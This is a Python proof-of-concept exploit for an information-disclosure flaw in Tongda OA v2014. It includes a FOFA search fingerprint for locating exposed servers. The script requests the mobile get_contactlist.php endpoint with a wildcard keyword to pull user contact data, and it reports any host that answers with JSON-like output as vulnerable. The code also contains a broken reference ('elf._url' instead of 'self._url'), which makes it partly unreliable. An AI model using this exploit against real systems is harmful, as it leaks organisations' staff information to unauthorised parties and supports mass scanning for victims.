import requests
from base_poc import base_poc


fofa_key = 'app="TDXK-通达OA"'
bug_name = "通达OA_v2014_敏感信息泄漏漏洞"


class POC(base_poc):
    def pyload(self):
        response = requests.get(
            self._url + "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3", timeout = 9
        )
        if (
            "{" in str(response.text)
            and "}" in str(response.text)
            and "[" in str(response.text)
            and "]" in str(response.text)
        ):
            return True
        return False

    def succeed(self):
        print(self._url + "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3")
        return (
            elf._url + "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3"
        )

    def failed(self):
        print(self._url + ":失败\n", end="")
        return self._url + ":失败"
